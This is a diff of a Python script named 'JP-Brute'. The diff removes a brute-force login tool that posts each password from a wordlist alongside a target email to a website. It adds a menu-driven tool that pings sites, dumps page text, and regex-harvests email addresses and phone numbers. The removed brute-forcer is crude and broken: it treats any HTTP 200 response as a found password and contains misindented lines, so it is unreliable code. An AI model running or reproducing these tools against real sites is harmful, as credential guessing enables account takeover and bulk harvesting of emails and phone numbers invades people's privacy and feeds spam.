@@ -1,75 +1,73 @@
-import itertools
-import string
-import hashlib
-import time
 import requests
+from bs4 import BeautifulSoup
+import re
+import os
 
-# JP Brute Banner
-print("""
- _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
-| | | | | | | | | | | | | | | | | | | | |
-| |_| | |_| | |_| | |_| | |_| | |_| | |_|
-|  J  P  B  R  U  T  E  H  A  C  K  E  R  |
-|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
-""")
+# Clear the terminal
+os.system('cls' if os.name == 'nt' else 'clear')
 
-# Menu Bar
-print("==========================================")
+# Print the title
+print("*" * 50)
+print("*                    JP-Brute                    *")
+print("*" * 50)
+print("Creator: James Phillips")
+print("Status: Free")
+print("Creation Date: December 4")
+print()
 
-print("|         JP Brute Force Tool           |")
-print("|---------------------------------------|")
-print("| Maker: James Phillips                 |")
-print("| Facebook: James Phillips             |")
-print("| Tool Status: Free                     |")
-print("==========================================")
+# Menu
+print("[1] Ping Website          [2] Web Scraping")
+print("[3] Web Email Scraping   [4] Web Number Scraping")
+print()
 
-# Get website URL and email
-website_url = input("Enter website URL: ")
-email = input("Enter email: ")
+# Get user input
+choice = input("Enter your choice: ")
+url = input("Enter the target website URL: ")
 
-# Get password list
-password_list = input("Enter password list file (default: wordlist.txt): ")
-if not password_list:
-    password_list = "wordlist.txt"
-
-# Load password list
-try:
-    with open(password_list, 'r') as file:
-        passwords = file.readlines()
-except FileNotFoundError:
-    print("Password list file not found.")
-    exit()
-
-# Ask to start
-start = input("Start brute force attack? (y/n): ")
-if start.lower() != 'y':
-    print("Exiting...")
-    exit()
-
-# Brute force attack
-for password in passwords:
-    password = password.strip()
+if choice == "1":
     try:
-        response = requests.post(website_url, data={'email': email, 'password': password})
+        response = requests.get(url)
         if response.status_code == 200:
-            print(f"Password found: {password}")
-            # Update menu bar with password
-            print("\033[H\033[J", end='')
-            print("""
- _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
-| | | | | | | | | | | | | | | | | | | | |
-| |_| | |_| | |_| | |_| | |_| | |_| | |_|
-|  J  P  B  R  U  T  E  H  A  C  K  E  R  |
-|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
-""")
-            print("==========================================")
+            print("\033[92m[ Success ] Website is up\033[0m")
+        else:
+            print("\033[91m[ Failed ] Website is down\033[0m")
+    except Exception as e:
+        print("\033[91m[ Failed ] Error: ", str(e), "\033[0m")
 
-print("|         JP Brute Force Tool           |")
-print("|---------------------------------------|")
-print(f"| Maker: James Phillips                 |")
-print("| Facebook: James Phillips             |")
-print(f"| Tool Status: Password Found - {password} |")
-            print("==========================================")
-            break
-    except requests.exceptions.RequestException as e:
-        print(f"Error: {e}")
+elif choice == "2":
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        print("\033[92m[ Success ] Web scraping successful\033[0m")
+        print(soup.text)
+    except Exception as e:
+        print("\033[91m[ Failed ] Error: ", str(e), "\033[0m")
+
+elif choice == "3":
+    try:
+        response = requests.get(url)
+        emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", response.text)
+        if emails:
+            print("\033[92m[ Success ] Emails found\033[0m")
+            for email in emails:
+                print(email)
+        else:
+            print("\033[91m[ Failed ] No emails found\033[0m")
+    except Exception as e:
+        print("\033[91m[ Failed ] Error: ", str(e), "\033[0m")
+
+elif choice == "4":
+    try:
+        response = requests.get(url)
+        numbers = re.findall(r'\d{3}[-\.\s]??\d{3}[-\.\s]??\d{4}|\(\d{3}\)\s*\d{3}[-\.\s]??\d{4}|\d{3}[-\.\s]??\d{4}', response.text)
+        if numbers:
+            print("\033[92m[ Success ] Numbers found\033[0m")
+            for number in numbers:
+                print(number)
+        else:
+            print("\033[91m[ Failed ] No numbers found\033[0m")
+    except Exception as e:
+        print("\033[91m[ Failed ] Error: ", str(e), "\033[0m")
+
+else:
+    print("\033[91m[ Failed ] Invalid choice\033[0m")
